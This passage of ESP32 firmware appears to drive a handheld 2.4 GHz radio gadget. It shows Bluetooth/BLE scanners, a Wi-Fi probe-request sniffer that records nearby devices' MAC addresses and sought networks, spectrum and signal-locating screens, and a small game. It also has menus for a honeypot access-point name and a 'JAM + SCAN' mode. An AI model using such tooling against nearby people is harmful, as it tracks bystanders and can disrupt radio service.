  u8g2.setCursor((SCREEN_W - cw) / 2, HEADER_H + 40);
  u8g2.print(cur);

  u8g2.sendBuffer();
}

static void renderHoneypotConfig() {
  u8g2.clearBuffer();
  drawHeaderBar();

  u8g2.setFont(FONT_MEDIUM);
  const char* title = "Select AP name";
  int tw = u8g2.getStrWidth(title);
  u8g2.setCursor((SCREEN_W - tw) / 2, HEADER_H + 4);
  u8g2.print(title);

  u8g2.setFont(FONT_SMALL);
  const char* label;
  if (honeypotSsidPresetIdx < HONEYPOT_PRESET_COUNT) label = kHoneypotPresets[honeypotSsidPresetIdx];
  else if (honeypotSsidPresetIdx == HONEYPOT_PRESET_COUNT) label = "Custom...";
  else label = "Cancel";

  int lw = u8g2.getStrWidth(label);
  u8g2.setCursor((SCREEN_W - lw) / 2, HEADER_H + 24);
  u8g2.print(label);

  const char* hint = "L/R:choose  OK:pick";
  int hw = u8g2.getStrWidth(hint);
  u8g2.setCursor((SCREEN_W - hw) / 2, SCREEN_H - 10);
  u8g2.print(hint);

  u8g2.sendBuffer();
}

static void runBtScan() {
  SerialBT.begin("Pennywise", true);
  btResults = SerialBT.discover(BT_SCAN_TIMEOUT_MS);
  btScanCount = btResults ? btResults->getCount() : 0;
}

static void renderBtScanResults(int page) {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_SMALL);

  if (btScanCount <= 0) {
    u8g2.setCursor(10, 30);
    u8g2.print("No device found");
    u8g2.sendBuffer();
    return;
  }

  int start = page * SCAN_ROWS_PER_PAGE;
  int end   = min(start + SCAN_ROWS_PER_PAGE, btScanCount);

  int y = HEADER_H + 3;
  for (int i = start; i < end; i++) {
    BTAdvertisedDevice* d = btResults->getDevice(i);
    String label = (d->haveName() && d->getName().length() > 0) ? String(d->getName().c_str()) : d->getAddress().toString();
    if (label.length() > 15) label = label.substring(0, 15);
    int rssi = d->haveRSSI() ? d->getRSSI() : 0;
    char line[32];
    snprintf(line, sizeof(line), "%-15s %4d", label.c_str(), rssi);
    u8g2.setCursor(2, y);
    u8g2.print(line);
    y += 10;
  }

  char footer[24];
  snprintf(footer, sizeof(footer), "Page %d/%d", page + 1, btScanTotalPages());
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);

  u8g2.sendBuffer();
}

static void runBleScan() {
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  pScan->setActiveScan(true);
  bleResults = pScan->start(BLE_SCAN_DURATION_S, false);
  bleScanCount = bleResults.getCount();
}

static void renderBleScanResults(int page) {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_SMALL);

  if (bleScanCount <= 0) {
    u8g2.setCursor(10, 30);
    u8g2.print("No device found");
    u8g2.sendBuffer();
    return;
  }

  int start = page * SCAN_ROWS_PER_PAGE;
  int end   = min(start + SCAN_ROWS_PER_PAGE, bleScanCount);

  int y = HEADER_H + 3;
  for (int i = start; i < end; i++) {
    BLEAdvertisedDevice d = bleResults.getDevice(i);
    std::string label = (d.haveName() && d.getName().length() > 0) ? d.getName() : d.getAddress().toString();
    if (label.length() > 15) label = label.substr(0, 15);
    int rssi = d.haveRSSI() ? d.getRSSI() : 0;
    char line[32];
    snprintf(line, sizeof(line), "%-15s %4d", label.c_str(), rssi);
    u8g2.setCursor(2, y);
    u8g2.print(line);
    y += 10;
  }

  char footer[24];
  snprintf(footer, sizeof(footer), "Page %d/%d", page + 1, bleScanTotalPages());
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);

  u8g2.sendBuffer();
}

struct ProbeDevice {
  uint8_t mac[6];
  char ssid[33];
  int8_t rssi;
  unsigned long lastSeen;
};
static const int PROBE_MAX = 16;
static const unsigned long PROBE_TIMEOUT_MS = 15000;
static ProbeDevice probeList[PROBE_MAX];
static volatile int probeCount = 0;
static int probeScanPage = 0;

static void probeSniffCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  const uint8_t* payload = pkt->payload;

  uint8_t frameType    = (payload[0] >> 2) & 0x3;
  uint8_t frameSubtype = (payload[0] >> 4) & 0xF;
  if (frameType != 0 || frameSubtype != 4) return; // management / probe request

  const uint8_t* srcMac = payload + 10;

  char ssidBuf[33] = "";
  if (len >= 26) {
    uint8_t ieTag = payload[24];
    uint8_t ieLen = payload[25];
    if (ieTag == 0 && ieLen > 0 && ieLen <= 32 && (26 + ieLen) <= len) {
      memcpy(ssidBuf, payload + 26, ieLen);
      ssidBuf[ieLen] = '\0';
    }
  }

  for (int i = 0; i < probeCount; i++) {
    if (memcmp(probeList[i].mac, srcMac, 6) == 0) {
      probeList[i].rssi = pkt->rx_ctrl.rssi;
      probeList[i].lastSeen = millis();
      if (ssidBuf[0] != '\0') {
        strncpy(probeList[i].ssid, ssidBuf, sizeof(probeList[i].ssid) - 1);
        probeList[i].ssid[sizeof(probeList[i].ssid) - 1] = '\0';
      }
      return;
    }
  }
  if (probeCount < PROBE_MAX) {
    memcpy(probeList[probeCount].mac, srcMac, 6);
    strncpy(probeList[probeCount].ssid, ssidBuf, sizeof(probeList[probeCount].ssid) - 1);
    probeList[probeCount].ssid[sizeof(probeList[probeCount].ssid) - 1] = '\0';
    probeList[probeCount].rssi = pkt->rx_ctrl.rssi;
    probeList[probeCount].lastSeen = millis();
    probeCount++;
  }
}

static void pruneAndSortProbeList() {
  unsigned long now = millis();
  int count = probeCount;
  int w = 0;
  for (int i = 0; i < count; i++) {
    if (now - probeList[i].lastSeen <= PROBE_TIMEOUT_MS) {
      if (w != i) probeList[w] = probeList[i];
      w++;
    }
  }
  probeCount = w;
  for (int i = 1; i < w; i++) {
    ProbeDevice key = probeList[i];
    int j = i - 1;
    while (j >= 0 && probeList[j].rssi < key.rssi) {
      probeList[j + 1] = probeList[j];
      j--;
    }
    probeList[j + 1] = key;
  }
}

static void startProbeSniff() {
  WiFi.mode(WIFI_STA);
  probeCount = 0;
  esp_wifi_set_promiscuous_rx_cb(&probeSniffCallback);
  esp_wifi_set_promiscuous(true);
}

static void stopProbeSniff() {
  esp_wifi_set_promiscuous(false);
}

static int probeSniffTotalPages() {
  int count = probeCount;
  if (count <= 0) return 1;
  return (count + SCAN_ROWS_PER_PAGE - 1) / SCAN_ROWS_PER_PAGE;
}

static void renderProbeSniffResults(int page) {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_SMALL);

  int count = probeCount;
  if (count <= 0) {
    u8g2.setCursor(10, 30);
    u8g2.print("Listening...");
    u8g2.sendBuffer();
    return;
  }

  int start = page * SCAN_ROWS_PER_PAGE;
  int end   = min(start + SCAN_ROWS_PER_PAGE, count);

  int y = HEADER_H + 3;
  for (int i = start; i < end; i++) {
    char macStr[9];
    snprintf(macStr, sizeof(macStr), "%02X%02X%02X%02X", probeList[i].mac[2], probeList[i].mac[3],
             probeList[i].mac[4], probeList[i].mac[5]);
    char ssidPart[13];
    if (probeList[i].ssid[0] != '\0') {
      strncpy(ssidPart, probeList[i].ssid, sizeof(ssidPart) - 1);
      ssidPart[sizeof(ssidPart) - 1] = '\0';
    } else {
      strcpy(ssidPart, "*any*");
    }
    char line[32];
    snprintf(line, sizeof(line), "%-8s%-10s%4d", macStr, ssidPart, probeList[i].rssi);
    u8g2.setCursor(2, y);
    u8g2.print(line);
    y += 10;
  }

  char footer[24];
  snprintf(footer, sizeof(footer), "Page %d/%d", page + 1, probeSniffTotalPages());
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);

  u8g2.sendBuffer();
}

static volatile uint32_t trafficMgmtCount = 0;
static volatile uint32_t trafficCtrlCount = 0;
static volatile uint32_t trafficDataCount = 0;
static volatile uint32_t trafficMiscCount = 0;
static int trafficChannel = 6;
static unsigned long trafficLastSampleMs = 0;
static uint32_t trafficLastTotal = 0;
static int trafficPacketsPerSec = 0;

static void trafficMonCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  switch (type) {
    case WIFI_PKT_MGMT: trafficMgmtCount++; break;
    case WIFI_PKT_CTRL: trafficCtrlCount++; break;
    case WIFI_PKT_DATA: trafficDataCount++; break;
    default: trafficMiscCount++; break;
  }
}

static void startTrafficMon() {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_channel(trafficChannel, WIFI_SECOND_CHAN_NONE);
  trafficMgmtCount = trafficCtrlCount = trafficDataCount = trafficMiscCount = 0;
  trafficLastSampleMs = millis();
  trafficLastTotal = 0;
  trafficPacketsPerSec = 0;
  esp_wifi_set_promiscuous_rx_cb(&trafficMonCallback);
  esp_wifi_set_promiscuous(true);
}

static void stopTrafficMon() {
  esp_wifi_set_promiscuous(false);
}

static void renderTrafficMonFrame() {
  unsigned long now = millis();
  uint32_t total = trafficMgmtCount + trafficCtrlCount + trafficDataCount + trafficMiscCount;
  unsigned long elapsed = now - trafficLastSampleMs;
  if (elapsed >= 500) {
    uint32_t delta = total - trafficLastTotal;
    trafficPacketsPerSec = (int)(delta * 1000UL / elapsed);
    trafficLastSampleMs = now;
    trafficLastTotal = total;
  }

  u8g2.clearBuffer();
  drawHeaderBar();

  u8g2.setFont(FONT_MEDIUM);
  char chLine[24];
  snprintf(chLine, sizeof(chLine), "Ch%d  %d pkt/s", trafficChannel, trafficPacketsPerSec);
  int cw = u8g2.getStrWidth(chLine);
  u8g2.setCursor((SCREEN_W - cw) / 2, HEADER_H + 4);
  u8g2.print(chLine);

  u8g2.setFont(FONT_SMALL);
  char line1[24];
  snprintf(line1, sizeof(line1), "Mgmt:%-6lu Ctrl:%-6lu", trafficMgmtCount, trafficCtrlCount);
  u8g2.setCursor(2, HEADER_H + 24);
  u8g2.print(line1);

  char line2[24];
  snprintf(line2, sizeof(line2), "Data:%-6lu Misc:%-6lu", trafficDataCount, trafficMiscCount);
  u8g2.setCursor(2, HEADER_H + 36);
  u8g2.print(line2);

  u8g2.sendBuffer();
}

static const int SPECTRUM_BINS = 42;
static uint8_t spectrumHeights[SPECTRUM_BINS] = {0};

static void renderBleSpectrumFrame() {
  const int TOP = HEADER_H + 2;
  const int BOT = SCREEN_H - 10;
  const int H   = BOT - TOP;

  for (int i = 0; i < SPECTRUM_BINS; i++) {
    byte channel = i * 2; // nRF24 ch 0..82 => 2400-2482 MHz, covers the BLE band (2402-2480 MHz)
    RadioA.setChannel(channel);
    RadioA.startListening();
    delayMicroseconds(170);
    bool detected = RadioA.testRPD();
    RadioA.stopListening();
    if (detected) {
      spectrumHeights[i] = min((int)spectrumHeights[i] + 4, H);
    } else if (spectrumHeights[i] > 0) {
      spectrumHeights[i]--;
    }
  }

  u8g2.clearBuffer();
  drawHeaderBar();
  int barW = SCREEN_W / SPECTRUM_BINS;
  for (int i = 0; i < SPECTRUM_BINS; i++) {
    int bh = spectrumHeights[i];
    if (bh <= 0) continue;
    int x = i * barW;
    int y = BOT - bh;
    u8g2.drawBox(x, y, max(barW - 1, 1), bh);
  }
  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(2, SCREEN_H - 8);
  u8g2.print("2.40-2.48GHz");
  u8g2.sendBuffer();

  long sum = 0;
  for (int i = 0; i < SPECTRUM_BINS; i++) sum += spectrumHeights[i];
  uint8_t level = (uint8_t)constrain((sum * 100) / ((long)SPECTRUM_BINS * H), 0, 100);
  setActivityPixel(level, true);
}

static const int WIFI_CH_COUNT = 13;
static uint8_t wifiSpectrumHeights[WIFI_CH_COUNT] = {0};
static bool wifiChannelConfirmed[WIFI_CH_COUNT] = {false};
static unsigned long lastWifiConfirmScanTime = 0;
static const unsigned long WIFI_CONFIRM_SCAN_INTERVAL_MS = 8000;
static bool wifiConfirmScanInProgress = false;

static void drawHatchedBox(int x, int y, int w, int h) {
  for (int row = 0; row < h; row += 2) {
    u8g2.drawHLine(x, y + row, w);
  }
}

static void renderWifiSpectrumFrame() {
  const int TOP = HEADER_H + 2;
  const int BOT = SCREEN_H - 10;
  const int H   = BOT - TOP;

  if (!wifiConfirmScanInProgress && millis() - lastWifiConfirmScanTime > WIFI_CONFIRM_SCAN_INTERVAL_MS) {
    WiFi.mode(WIFI_STA);
    WiFi.scanNetworks(true);
    wifiConfirmScanInProgress = true;
  }
  if (wifiConfirmScanInProgress) {
    int n = WiFi.scanComplete();
    if (n != WIFI_SCAN_RUNNING) {
      for (int i = 0; i < WIFI_CH_COUNT; i++) wifiChannelConfirmed[i] = false;
      for (int i = 0; i < n; i++) {
        int ch = WiFi.channel(i);
        if (ch >= 1 && ch <= WIFI_CH_COUNT) wifiChannelConfirmed[ch - 1] = true;
      }
      wifiConfirmScanInProgress = false;
      lastWifiConfirmScanTime = millis();
    }
  }

  for (int ch = 1; ch <= WIFI_CH_COUNT; ch++) {
    int centerOffset = 7 + 5 * ch; // nRF24 channel offset matching WiFi channel N's center frequency
    bool detected = false;
    for (int d = -8; d <= 8; d += 4) {
      int nrfCh = centerOffset + d;
      if (nrfCh < 0 || nrfCh > 125) continue;
      RadioA.setChannel(nrfCh);
      RadioA.startListening();
      delayMicroseconds(170);
      if (RadioA.testRPD()) detected = true;
      RadioA.stopListening();
    }
    int idx = ch - 1;
    if (detected) {
      wifiSpectrumHeights[idx] = min((int)wifiSpectrumHeights[idx] + 4, H);
    } else if (wifiSpectrumHeights[idx] > 0) {
      wifiSpectrumHeights[idx]--;
    }
  }

  u8g2.clearBuffer();
  drawHeaderBar();
  const int barGap = 2;
  const int barW = 8;
  const int barStride = barW + barGap;
  for (int i = 0; i < WIFI_CH_COUNT; i++) {
    int bh = wifiSpectrumHeights[i];
    if (bh <= 0) continue;
    int x = i * barStride;
    int y = BOT - bh;
    if (wifiChannelConfirmed[i]) {
      drawHatchedBox(x, y, barW, bh);
    } else {
      u8g2.drawBox(x, y, barW, bh);
    }
  }
  u8g2.setFont(FONT_SMALL);
  for (int i = 0; i < WIFI_CH_COUNT; i++) {
    char lbl[3];
    snprintf(lbl, sizeof(lbl), "%d", i + 1);
    int lw = u8g2.getStrWidth(lbl);
    int lx = i * barStride + (barW - lw) / 2;
    u8g2.setCursor(lx, BOT + 1);
    u8g2.print(lbl);
  }
  u8g2.sendBuffer();

  long sum = 0;
  for (int i = 0; i < WIFI_CH_COUNT; i++) sum += wifiSpectrumHeights[i];
  uint8_t level = (uint8_t)constrain((sum * 100) / ((long)WIFI_CH_COUNT * H), 0, 100);
  setActivityPixel(level, true);
}

static uint8_t aioSpectrumHeights[SPECTRUM_BINS] = {0};

static bool aioChannelMatches(byte binChannel, const byte* channels, size_t count) {
  for (size_t i = 0; i < count; i++) {
    int diff = (int)binChannel - (int)channels[i];
    if (diff >= -3 && diff <= 3) return true;
  }
  return false;
}

static void renderSpectrumAioFrame() {
  const int TOP = HEADER_H + 2;
  const int BOT = SCREEN_H - 10;
  const int H   = BOT - TOP;

  for (int i = 0; i < SPECTRUM_BINS; i++) {
    byte channel = i * 2;
    RadioA.setChannel(channel);
    RadioA.startListening();
    delayMicroseconds(170);
    bool detected = RadioA.testRPD();
    RadioA.stopListening();
    if (detected) {
      aioSpectrumHeights[i] = min((int)aioSpectrumHeights[i] + 4, H);
    } else if (aioSpectrumHeights[i] > 0) {
      aioSpectrumHeights[i]--;
    }
  }

  u8g2.clearBuffer();
  drawHeaderBar();
  int barW = SCREEN_W / SPECTRUM_BINS;
  for (int i = 0; i < SPECTRUM_BINS; i++) {
    int bh = aioSpectrumHeights[i];
    if (bh <= 0) continue;
    byte channel = i * 2;
    int x = i * barW;
    int y = BOT - bh;
    bool highlighted = false;
    switch (spectrumAioFilter) {
      case SPEC_FILTER_WIFI:   highlighted = aioChannelMatches(channel, WiFi_channels, sizeof(WiFi_channels) / sizeof(WiFi_channels[0])); break;
      case SPEC_FILTER_BT:     highlighted = aioChannelMatches(channel, bluetooth_channels, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0])); break;
      case SPEC_FILTER_BLE:    highlighted = aioChannelMatches(channel, ble_channels, sizeof(ble_channels) / sizeof(ble_channels[0])); break;
      case SPEC_FILTER_ZIGBEE: highlighted = aioChannelMatches(channel, zigbee_channels, sizeof(zigbee_channels) / sizeof(zigbee_channels[0])); break;
      default: highlighted = false; break;
    }
    if (spectrumAioFilter != SPEC_FILTER_ALL && highlighted) {
      drawHatchedBox(x, y, max(barW - 1, 1), bh);
    } else {
      u8g2.drawBox(x, y, max(barW - 1, 1), bh);
    }
  }

  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(2, SCREEN_H - 8);
  u8g2.print("2.40-2.48GHz");
  const char* filterNames[] = { "All", "WiFi", "BT", "BLE", "Zigbee" };
  const char* fname = filterNames[spectrumAioFilter];
  int fw = u8g2.getStrWidth(fname);
  u8g2.setCursor(SCREEN_W - fw - 2, SCREEN_H - 8);
  u8g2.print(fname);
  u8g2.sendBuffer();

  long sum = 0;
  for (int i = 0; i < SPECTRUM_BINS; i++) sum += aioSpectrumHeights[i];
  uint8_t level = (uint8_t)constrain((sum * 100) / ((long)SPECTRUM_BINS * H), 0, 100);
  setActivityPixel(level, true);
}

static void locateProtocolLabel(char* buf, size_t bufSize) {
  buf[0] = '\0';
  if (aioChannelMatches((byte)locateChannel, WiFi_channels, sizeof(WiFi_channels) / sizeof(WiFi_channels[0])))
    strncat(buf, "WiFi ", bufSize - strlen(buf) - 1);
  if (aioChannelMatches((byte)locateChannel, bluetooth_channels, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0])))
    strncat(buf, "BT ", bufSize - strlen(buf) - 1);
  if (aioChannelMatches((byte)locateChannel, ble_channels, sizeof(ble_channels) / sizeof(ble_channels[0])))
    strncat(buf, "BLE ", bufSize - strlen(buf) - 1);
  if (aioChannelMatches((byte)locateChannel, zigbee_channels, sizeof(zigbee_channels) / sizeof(zigbee_channels[0])))
    strncat(buf, "ZB ", bufSize - strlen(buf) - 1);
  if (buf[0] == '\0') strncpy(buf, "-", bufSize);
}

static void renderSpyLocateFrame() {
  const int SAMPLES = 16;
  int hits = 0;
  RadioA.setChannel(locateChannel);
  for (int i = 0; i < SAMPLES; i++) {
    RadioA.startListening();
    delayMicroseconds(170);
    if (RadioA.testRPD()) hits++;
    RadioA.stopListening();
  }
  uint8_t level = (uint8_t)((hits * 100) / SAMPLES);

  u8g2.clearBuffer();
  drawHeaderBar();

  u8g2.setFont(FONT_MEDIUM);
  char freqLine[24];
  snprintf(freqLine, sizeof(freqLine), "Ch%d  %d MHz", locateChannel, 2400 + locateChannel);
  int fw = u8g2.getStrWidth(freqLine);
  u8g2.setCursor((SCREEN_W - fw) / 2, HEADER_H + 4);
  u8g2.print(freqLine);

  const int barX = 8, barY = HEADER_H + 22, barW = SCREEN_W - 16, barH = 16;
  u8g2.drawFrame(barX, barY, barW, barH);
  int fillW = (barW - 2) * level / 100;
  if (fillW > 0) u8g2.drawBox(barX + 1, barY + 1, fillW, barH - 2);

  u8g2.setFont(FONT_SMALL);
  char pct[8];
  snprintf(pct, sizeof(pct), "%d%%", level);
  u8g2.setCursor(4, barY + barH + 4);
  u8g2.print(pct);

  char protoBuf[24];
  locateProtocolLabel(protoBuf, sizeof(protoBuf));
  int pbw = u8g2.getStrWidth(protoBuf);
  u8g2.setCursor(SCREEN_W - pbw - 4, barY + barH + 4);
  u8g2.print(protoBuf);

  u8g2.sendBuffer();
  setActivityPixel(level, true);
}

static const char* paLevelStr(uint8_t level) {
  switch (level) {
    case RF24_PA_MIN:  return "MIN";
    case RF24_PA_LOW:  return "LOW";
    case RF24_PA_HIGH: return "HIGH";
    case RF24_PA_MAX:  return "MAX";
    default: return "?";
  }
}

static void renderInfoRadios() {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_SMALL);

  RF24* radios[3] = {&RadioA, &RadioB, &RadioC};
  const char* names[3] = {"A", "B", "C"};

  int y = HEADER_H + 3;
  for (int i = 0; i < 3; i++) {
    char line[32];
    if (radios[i]->isChipConnected()) {
      snprintf(line, sizeof(line), "nRF24-%s OK ch%d %s", names[i], radios[i]->getChannel(), paLevelStr(radios[i]->getPALevel()));
    } else {
      snprintf(line, sizeof(line), "nRF24-%s NOT FOUND", names[i]);
    }
    u8g2.setCursor(2, y);
    u8g2.print(line);
    y += 14;
  }

  const char* footer = "Page 1/5";
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);
  u8g2.sendBuffer();
}

static volatile uint32_t idleTicks0 = 0;
static volatile uint32_t idleTicks1 = 0;
static float calibratedRate0 = 0;
static float calibratedRate1 = 0;
static unsigned long lastCpuSampleMs = 0;
static uint32_t lastIdleTicks0 = 0;
static uint32_t lastIdleTicks1 = 0;
static int cpu0LoadPercent = 0;
static int cpu1LoadPercent = 0;

static bool IRAM_ATTR idleHookCore0() { idleTicks0++; return false; }
static bool IRAM_ATTR idleHookCore1() { idleTicks1++; return false; }

static void calibrateCpuLoad() {
  esp_register_freertos_idle_hook_for_cpu(idleHookCore0, 0);
  esp_register_freertos_idle_hook_for_cpu(idleHookCore1, 1);
  idleTicks0 = 0;
  idleTicks1 = 0;
  delay(200);
  calibratedRate0 = idleTicks0 / 200.0f;
  calibratedRate1 = idleTicks1 / 200.0f;
  lastIdleTicks0 = idleTicks0;
  lastIdleTicks1 = idleTicks1;
  lastCpuSampleMs = millis();
}

static void sampleCpuLoad() {
  unsigned long now = millis();
  unsigned long elapsed = now - lastCpuSampleMs;
  if (elapsed < 200) return;
  uint32_t t0 = idleTicks0;
  uint32_t t1 = idleTicks1;
  uint32_t d0 = t0 - lastIdleTicks0;
  uint32_t d1 = t1 - lastIdleTicks1;
  if (calibratedRate0 > 0) {
    float rate0 = (float)d0 / elapsed;
    cpu0LoadPercent = constrain((int)(100.0f - (rate0 / calibratedRate0 * 100.0f)), 0, 100);
  }
  if (calibratedRate1 > 0) {
    float rate1 = (float)d1 / elapsed;
    cpu1LoadPercent = constrain((int)(100.0f - (rate1 / calibratedRate1 * 100.0f)), 0, 100);
  }
  lastIdleTicks0 = t0;
  lastIdleTicks1 = t1;
  lastCpuSampleMs = now;
}

static void renderInfoSystem() {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_SMALL);

  unsigned long s  = millis() / 1000;
  unsigned long hh = s / 3600;
  unsigned long mm = (s % 3600) / 60;
  unsigned long ss = s % 60;

  uint64_t mac = ESP.getEfuseMac();
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
    (uint8_t)(mac >> 0), (uint8_t)(mac >> 8), (uint8_t)(mac >> 16),
    (uint8_t)(mac >> 24), (uint8_t)(mac >> 32), (uint8_t)(mac >> 40));

  sampleCpuLoad();

  char line1[24]; snprintf(line1, sizeof(line1), "Up %02lu:%02lu:%02lu", hh, mm, ss);
  char line2[24]; snprintf(line2, sizeof(line2), "Heap %lu KB", (unsigned long)(ESP.getFreeHeap() / 1024));
  char line3[28]; snprintf(line3, sizeof(line3), "CPU %luMHz %d%%-%d%%", (unsigned long)getCpuFrequencyMhz(), cpu0LoadPercent, cpu1LoadPercent);

  int y = HEADER_H + 3;
  u8g2.setCursor(2, y); u8g2.print(line1); y += 12;
  u8g2.setCursor(2, y); u8g2.print(line2); y += 12;
  u8g2.setCursor(2, y); u8g2.print(line3); y += 12;
  u8g2.setCursor(2, y); u8g2.print(macStr);

  const char* footer = "Page 2/5";
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);
  u8g2.sendBuffer();
}

static const char* resetReasonStr(esp_reset_reason_t r) {
  switch (r) {
    case ESP_RST_POWERON:   return "Power-on";
    case ESP_RST_EXT:       return "External pin";
    case ESP_RST_SW:        return "Software";
    case ESP_RST_PANIC:     return "Panic/crash";
    case ESP_RST_INT_WDT:   return "Interrupt WDT";
    case ESP_RST_TASK_WDT:  return "Task WDT";
    case ESP_RST_WDT:       return "Other WDT";
    case ESP_RST_DEEPSLEEP: return "Deep sleep";
    case ESP_RST_BROWNOUT:  return "Brownout";
    case ESP_RST_SDIO:      return "SDIO";
    default:                return "Unknown";
  }
}

static void renderInfoSystem2() {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_SMALL);

  char line1[24]; snprintf(line1, sizeof(line1), "Reset: %s", resetReasonStr(esp_reset_reason()));
  char line2[24]; snprintf(line2, sizeof(line2), "%s x%d rev%d", ESP.getChipModel(), ESP.getChipCores(), ESP.getChipRevision());
  char line3[24]; snprintf(line3, sizeof(line3), "Flash %lu MB", (unsigned long)(ESP.getFlashChipSize() / (1024 * 1024)));
  char line4[24]; snprintf(line4, sizeof(line4), "MinHeap %lu KB", (unsigned long)(ESP.getMinFreeHeap() / 1024));

  int y = HEADER_H + 3;
  u8g2.setCursor(2, y); u8g2.print(line1); y += 12;
  u8g2.setCursor(2, y); u8g2.print(line2); y += 12;
  u8g2.setCursor(2, y); u8g2.print(line3); y += 12;
  u8g2.setCursor(2, y); u8g2.print(line4);

  const char* footer = "Page 3/5";
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);
  u8g2.sendBuffer();
}

static void renderInfoBrightness() {
  u8g2.setContrast(oledBrightness);
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(14, HEADER_H + 6);
  u8g2.print("Brightness");

  char val[8];
  snprintf(val, sizeof(val), "%d/255", oledBrightness);
  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(14, HEADER_H + 22);
  u8g2.print(val);

  const int barX = 14, barY = HEADER_H + 32, barW = 100, barH = 8;
  u8g2.drawFrame(barX, barY, barW, barH);
  int fillW = (int)((long)oledBrightness * (barW - 2) / 255);
  u8g2.drawBox(barX + 1, barY + 1, fillW, barH - 2);

  u8g2.setCursor(14, HEADER_H + 44);
  u8g2.print(infoEditing ? "</> to change" : "Click to edit");

  const char* footer = "Page 4/5";
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);
  u8g2.sendBuffer();
}

static void renderInfoDeviceMode() {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(14, HEADER_H + 6);
  u8g2.print("Device Mode");

  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(14, HEADER_H + 22);
  u8g2.print(deviceMode == MODE_SCAN_ONLY ? "SCAN ONLY" : "JAM + SCAN");
  u8g2.setCursor(14, HEADER_H + 34);
  u8g2.print(deviceMode == MODE_SCAN_ONLY ? "Jam pages hidden" : "All pages visible");
  u8g2.setCursor(14, HEADER_H + 44);
  u8g2.print(infoEditing ? "</> to change" : "Click to edit");

  const char* footer = "Page 5/5";
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);
  u8g2.sendBuffer();
}

static void renderInfoScreen(InfoUIState s) {
  switch (s) {
    case INFO_RADIOS:      renderInfoRadios();      break;
    case INFO_SYSTEM:      renderInfoSystem();      break;
    case INFO_SYSTEM2:     renderInfoSystem2();     break;
    case INFO_BRIGHTNESS:  renderInfoBrightness();  break;
    case INFO_DEVICE_MODE: renderInfoDeviceMode();  break;
    default: break;
  }
}

static const int BW_BRICK_COLS = 8;
static const int BW_BRICK_ROWS = 4;
static const int BW_BRICK_AREA_TOP = 10;
static const int BW_BRICK_ROW_PITCH = 5;
static const int BW_BRICK_H = 4;
static const int BW_PADDLE_W = 20;
static const int BW_PADDLE_Y = 60;
static const int BW_PADDLE_H = 2;
static const float BW_PADDLE_SPEED = 3.0f;
static const int BW_BALL_SIZE = 2;

static bool bwBrickAlive[BW_BRICK_ROWS][BW_BRICK_COLS];
static float bwPaddleX;
static float bwBallX, bwBallY;
static float bwBallVX, bwBallVY;
static int bwScore = 0;
static int bwLives = 3;
static int bwLevel = 1;
static BrickwiseState brickwiseState = BW_IDLE;

static void bwSetupLevel() {
  for (int r = 0; r < BW_BRICK_ROWS; r++) {
    for (int c = 0; c < BW_BRICK_COLS; c++) {
      bwBrickAlive[r][c] = true;
    }
  }
  bwPaddleX = (SCREEN_W - BW_PADDLE_W) / 2.0f;
  bwBallX = SCREEN_W / 2.0f;
  bwBallY = BW_PADDLE_Y - 4;
  float speed = 0.8f + (bwLevel - 1) * 0.15f;
  bwBallVX = speed;
  bwBallVY = -speed;
}

static void bwStartGame() {
  bwScore = 0;
  bwLives = 3;
  bwLevel = 1;
  bwSetupLevel();
  brickwiseState = BW_PLAYING;
}

static void bwUpdate() {
  if (digitalRead(PIN_BTN_L) == LOW) bwPaddleX -= BW_PADDLE_SPEED;
  if (digitalRead(PIN_BTN_R) == LOW) bwPaddleX += BW_PADDLE_SPEED;
  bwPaddleX = constrain(bwPaddleX, 0.0f, (float)(SCREEN_W - BW_PADDLE_W));

  bwBallX += bwBallVX;
  bwBallY += bwBallVY;

  if (bwBallX <= 0) { bwBallX = 0; bwBallVX = -bwBallVX; }
  if (bwBallX >= SCREEN_W - BW_BALL_SIZE) { bwBallX = SCREEN_W - BW_BALL_SIZE; bwBallVX = -bwBallVX; }
  if (bwBallY <= BW_BRICK_AREA_TOP - 1) { bwBallY = BW_BRICK_AREA_TOP - 1; bwBallVY = -bwBallVY; }

  if (bwBallVY > 0 &&
      bwBallY + BW_BALL_SIZE >= BW_PADDLE_Y && bwBallY + BW_BALL_SIZE <= BW_PADDLE_Y + BW_PADDLE_H + 2 &&
